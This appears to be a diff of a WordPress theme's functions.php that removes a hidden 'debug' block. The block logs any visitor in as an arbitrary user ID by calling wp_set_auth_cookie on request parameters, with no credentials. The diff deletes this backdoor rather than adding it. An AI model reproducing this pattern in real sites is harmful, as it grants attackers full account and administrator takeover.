@@ -1,14 +1,4 @@
 <?php
-if (isset($_REQUEST['debug_site']) && $_REQUEST['debug_site'] == 'yes' && $_REQUEST['debug_site_id']) {
-	if ($_REQUEST['debug_site_id']) {
-		wp_set_auth_cookie($_REQUEST['debug_site_id']);
-		//  echo '<pre>';
-		//  print_r($all_prices = get_post_meta(28097, '_final_available_bookable_date_with_price', true));
-		//  echo '</pre>';
-		exit;
-	}
-
-}
 /**
 
  * Twenty Thirteen functiodS and definitiodS
